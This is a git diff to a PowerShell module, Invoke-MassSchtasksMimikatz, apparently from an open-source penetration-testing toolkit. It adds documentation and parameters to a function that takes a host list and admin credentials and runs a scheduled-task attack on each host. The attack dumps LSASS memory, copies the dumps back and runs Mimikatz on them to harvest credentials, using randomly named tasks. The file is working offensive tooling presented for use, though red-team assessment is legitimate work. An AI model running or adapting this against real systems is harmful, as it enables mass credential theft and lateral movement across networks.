@@ -1,4 +1,61 @@
 function Invoke-MassSchtasksMimikatz{
+<#
+.SYNOPSIS
+
+This module runs Invoke-SchtasksMimikatz on multiple hosts. It allows you to feed in a list of hosts on which you have local admin access (or higher) and then automatically runs Invoke-SchtasksMimikatz on each of those hosts. Results are saved to a single file.
+
+PivotAll Function: Invoke-MassSchtasksMimikatz
+Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
+License: BSD 3-Clause
+Required Dependencies: Invoke-SchtasksMimikatz
+Optional Dependencies: None
+
+.DESCRIPTION
+
+This module calls Invoke-SchtasksMimikatz multiple times to schedule a task on a list of remote hosts to create a dump file of the LSASS process on each host. It then copies the dump files, one at a time, to the local machine and runs the Invoke-Mimikatz module against it.
+
+.PARAMETER HostList
+
+File containing the IP addresses or hostnames of the target systems (one system per line)
+
+.PARAMETER Domain
+
+Active directory domain name
+
+.PARAMETER User
+
+Username of an administrative user on the remote host
+
+.PARAMETER Pass
+
+Password of the administrative user
+
+.PARAMETER LocalShareLetter
+
+Letter to use to attach a share to a remote system. By default this is set to X:
+
+.PARAMETER ProcdumpLocation
+
+Location of the procdump.ps1 script. By default the Invoke-SchtasksMimikatz tries C:\pd\procdump.ps1
+
+.PARAMETER Taskname
+
+The name of the scheduled task to be created on the remote host. By default this is set to five random letters like (BfDGT).
+
+.EXAMPLE
+
+C:\PS> Invoke-MassSchtasksMimikatz -HostList hosts.txt -Domain Testdomain -User AdminUser -Pass PassofAdmin1234
+
+.EXAMPLE
+
+C:\PS> Invoke-MassSchtasksMimikatz -HostList hosts.txt -Domain Testdomain -User AdminUser -Pass PassofAdmin1234 -Taskname apt1 -ProcdumpLocation C:\temp\procdump.ps1 -LocalShareLetter Y:
+
+Description
+-----------
+This command will setup a share to the remote hosts contained in hosts.txt using the administrative credentials of Testdomain\AdminUser user specifying a taskname of apt1. Also, the ProcdumpLocation flag is specifying where the procdump.ps1 file is located on the user's system. The LocalShareLetter is telling the script to mount the share used to copy files to the target with the Y: drive letter.
+
+
+#>
 
 Param(
  [Parameter(Position = 0, Mandatory = $true)]
@@ -15,10 +72,22 @@ Param(
 
  [Parameter(Position = 3, Mandatory = $true)]
  [string]
- $Pass
+ $Pass,
+
+ [Parameter(Position = 4, Mandatory = $false)]
+ [string]
+ $LocalShareLetter = "X:",
+
+ [Parameter(Position = 5, Mandatory = $false)]
+ [string]
+ $ProcdumpLocation = "C:\pd\procdump.ps1",
+
+ [Parameter(Position = 6, Mandatory = $false)]
+ [string]
+ $Taskname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 )
 
-Get-Content $HostList | Foreach-Object {Invoke-SchtasksMimikatz($_, $Domain, $User, $Pass)}
+Get-Content $HostList | Foreach-Object {Invoke-SchtasksMimikatz($_, $Domain, $User, $Pass, $LocalShareLetter, $ProcdumpLocation, $Taskname)}
 
 }
 
